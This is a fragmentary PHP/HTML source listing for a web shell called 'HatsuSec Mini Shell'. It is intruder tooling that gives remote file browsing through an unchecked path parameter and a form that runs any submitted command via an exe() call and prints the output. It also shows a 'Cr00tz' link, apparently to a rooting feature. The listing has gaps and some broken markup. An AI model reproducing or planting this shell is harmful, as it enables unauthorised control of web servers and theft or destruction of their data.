...
<html>
<head>
<link rel="icon" href="https://unixtitan.net/images/miku-drawing-professional-5.png" type="image/gif">
<link href="" rel="stylesheet" type="text/css">
<title>HatsuSec Mini Shell</title>
<style>
body{
	font-family: "Racing Sans One", cursive;
	background-image: url("https://images8.alphacoders.com/415/thumb-1920-415511.jpg");
	color:white;
...
<body>
<h1><center><font color="White">HatsuSec Mini Shell</font></center></h1>
<table width="700" border="0" cellpadding="3" cellspacing="1" align="center">
<tr><td>';
echo "Disable Functions: $liatds";
echo '<br><font color="white">Path :</font> ';
if(isset($_GET['path'])){
$path = $_GET['path'];
}else{
$path = getcwd();
...
if($pat == '' && $id == 0){
$a = true;
echo '<a href="?path=/"><font color="white">/</font></a>';
continue;
}
if($pat == '') continue;
echo '<a href="?path=';
...
if($_POST['execmd']) {
echo "<center><textarea cols='60' rows='10' readonly='readonly' style='color:white; background-color:pink;'>".exe($_POST['cmd'])."</textarea></center>";
}
echo "<br></td></tr>";
...
<tr class="first">
<td><center><font color="white">Name</font></peller></center></td>
<td><center><font color="white">Size</font></peller></center></td>
<td><center><font color="white">Permission</font></peller></center></td>
<td><center><font color="white">Modify</font></peller></center></td>
</tr>';
...
<td><font color="white"><center>'.$size.'</center></font></td>
<td><center>';
...
echo '<center><br/><font color="White">HatsuSec Mini Shell</font><br>';
echo "<a href='?path=$path&go=cabs'>Cr00tz</a>
</center>
</body>
</html>";
